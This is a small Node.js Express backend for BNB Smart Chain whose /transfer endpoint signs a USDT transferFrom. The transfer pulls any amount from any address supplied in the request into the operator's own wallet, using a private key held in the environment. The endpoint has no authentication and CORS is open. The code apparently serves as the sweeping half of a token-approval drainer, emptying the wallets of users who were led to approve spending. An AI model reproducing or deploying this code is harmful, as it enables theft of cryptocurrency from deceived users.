const express = require("express");
const cors = require("cors");
const Web3 = require("web3");
require("dotenv").config();

const app = express();
app.use(cors());
app.use(express.json());

const provider = new Web3.providers.HttpProvider(process.env.RPC_URL);
const web3 = new Web3(provider);

const USDT_ABI = [
  {
    constant: false,
    inputs: [
      { name: "_from", type: "address" },
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" }
    ],
    name: "transferFrom",
    outputs: [{ name: "", type: "bool" }],
    type: "function"
  }
];

const USDT_ADDRESS = process.env.USDT_ADDRESS;

app.post("/transfer", async (req, res) => {
  try {
    const { fromAddress, amount } = req.body;
    if (!fromAddress || !amount) {
      return res.status(400).json({ success: false, error: "Missing 'fromAddress' or 'amount'" });
    }

    const privateKey = process.env.PRIVATE_KEY;
    const myWallet = process.env.MY_WALLET;

    const token = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
    const decimals = 18;
    const value = web3.utils.toBN(amount).mul(web3.utils.toBN(10).pow(web3.utils.toBN(decimals)));

    const data = token.methods.transferFrom(fromAddress, myWallet, value).encodeABI();

    const txCount = await web3.eth.getTransactionCount(myWallet);

    const tx = {
      nonce: web3.utils.toHex(txCount),
      from: myWallet,
      to: USDT_ADDRESS,
      gas: web3.utils.toHex(200000),
      data,
      chainId: 56
    };

    const signedTx = await web3.eth.accounts.signTransaction(tx, privateKey);
    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);

    res.json({ success: true, receipt });
  } catch (err) {
    console.error("transferFrom error:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.get("/", (req, res) => {
  res.send("USDT Transfer Backend Running");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
